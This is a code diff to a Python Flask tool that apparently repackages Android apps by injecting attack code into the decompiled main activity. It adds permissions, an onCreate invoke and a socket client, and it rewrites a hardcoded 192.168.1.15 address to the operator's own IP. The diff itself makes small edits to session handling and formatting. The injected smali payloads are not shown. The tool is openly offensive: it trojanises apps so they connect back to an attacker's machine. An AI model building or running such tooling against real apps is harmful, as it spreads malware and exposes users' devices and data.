@@ -1,3 +1,5 @@
+import pickle
+
 from flask import session
 from bs4 import BeautifulSoup as bs
 from utils.utils_func import filename_cutter, string_to_list, open_file
@@ -7,7 +9,7 @@ from utils.global_const import DECOMPILED_APK, xml_identifier, permission_suffix
     ON_CREATE_PUBLIC, \
     ON_CREATE_PRIVATE, \
     ON_CREATE_PROTECTED, ON_CREATE_RETURN, MAIN_ACTIVITY_NAME, MAIN_ACTIVITY_PATH, MAIN_ACTIVITY_PACK, PATH_SUFFIX, \
-    PACKAGE_LIST, SHARED_NAME
+    PACKAGE_LIST, SHARED_NAME, PACKAGE_TEST
 from utils.query import query
 
 
@@ -157,7 +159,7 @@ def add_socket_client(file, activityMainPath, path):
     main_activity.write(smali)
     main_activity.close()
 
-    session.clear()
+    #session.clear()
 
 
 def mainActivity_modifier(file, injection_type, client_payload):
@@ -207,14 +209,15 @@ def mainActivity_modifier(file, injection_type, client_payload):
     activityMain_file.write(activityMain_content)
     activityMain_file.close()
 
+
     if client_payload == 'client':
         add_socket_client(file, activityMainPath, path)
         print('Socket client was added')
     else:
         if 'package' not in session:
-            session['package'] = []
-        session['package'].append(package)
-        session.modified = True
+            session['package'] = PACKAGE_TEST
+        #session['package'].append(package)
+        #session.modified = True
         print(session['package'])
         print("this application isn't the last, socket client skip")
 
@@ -228,16 +231,13 @@ def mainActivity_socket_client(file, injection_type):
     # TODO ADD DNS ADDRESS
     ipv4 = os.popen('ifconfig en0').read().split("inet ")[1].split(" ")[0]
 
-
     # Attack component
     attack_parts = query(injection_type)
     permissions = attack_parts[0][0]
     invoke = attack_parts[0][1]
     send = attack_parts[0][2]
 
-
-
-    send = re.sub(MAIN_ACTIVITY_PATH, 'L'+fer.replace(".", "/"),send)
+    send = re.sub(MAIN_ACTIVITY_PATH, 'L' + fer.replace(".", "/"), send)
     send = re.sub(MAIN_ACTIVITY_NAME, app_name, send)
     send = re.sub('192.168.1.15', ipv4, send)
 
@@ -259,10 +259,9 @@ def mainActivity_socket_client(file, injection_type):
 
     invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + fer.replace(".", "/"), invoke)
     smali = before_onCreate + onCreate + invoke + "\n" + mainActivity[onCreate_final:len(mainActivity)] + "\n"
-    #print(smali)
+    # print(smali)
 
     main_activity.close()
     main_activity = open(activityMainPath, "w")
     main_activity.write(smali)
     main_activity.close()
-
